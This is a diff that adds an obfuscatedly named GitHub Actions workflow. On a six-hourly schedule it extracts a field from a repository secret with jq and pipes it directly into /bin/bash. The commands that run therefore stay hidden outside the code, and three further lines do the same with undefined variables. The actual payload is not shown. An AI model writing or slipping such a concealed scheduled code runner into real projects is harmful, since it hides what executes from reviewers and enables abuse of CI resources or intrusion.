@@ -1,0 +1,20 @@
+name: wengjingshi1290
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wengjingshi1290
+        env:
+          yoyr97399: ${{ secrets.yoyr97399 }}
+        run: |
+          echo $yoyr97399 | jq -r .q73 | /bin/bash
+          echo $q2008 | jq -r .nrt71 | /bin/bash
+          echo $lw0 | jq -r .vfoc23 | /bin/bash
+          echo $lgg4 | jq -r .d4764 | /bin/bash
+
